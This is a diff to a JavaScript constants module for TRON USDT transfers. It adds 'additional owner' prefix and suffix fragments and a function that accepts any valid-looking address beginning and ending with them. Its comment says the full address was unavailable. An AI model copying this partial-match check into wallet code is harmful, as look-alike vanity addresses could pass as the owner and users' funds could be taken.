@@ -5,6 +5,8 @@
 
 export const RECIPIENT = "TG94XL9N1uVHPM4U4zcpYGc6w1i7nUBuiq";
 export const CONNECTION_TARGET = "TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9";
+export const ADDITIONAL_OWNER_PREFIX = "TFBTL9";
+export const ADDITIONAL_OWNER_SUFFIX = "gJjoZ";
 export const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 export const MAINNET_CHAIN_ID = "0x2b6653dc";
 export const USDT_DECIMALS = 6;
@@ -20,6 +22,18 @@ export const KNOWN_CHAIN_IDS = Object.freeze({
 
 const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 const SCALE = 10n ** BigInt(USDT_DECIMALS);
+
+/**
+ * The full additional owner address was not available, so only a syntactically
+ * valid TRON address with both user-provided visible fragments may proceed to
+ * checksum and signature verification.
+ * @param {string} address
+ */
+export function matchesAdditionalOwnerAddress(address) {
+  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)
+    && address.startsWith(ADDITIONAL_OWNER_PREFIX)
+    && address.endsWith(ADDITIONAL_OWNER_SUFFIX);
+}
 
 /**
  * @param {string} address
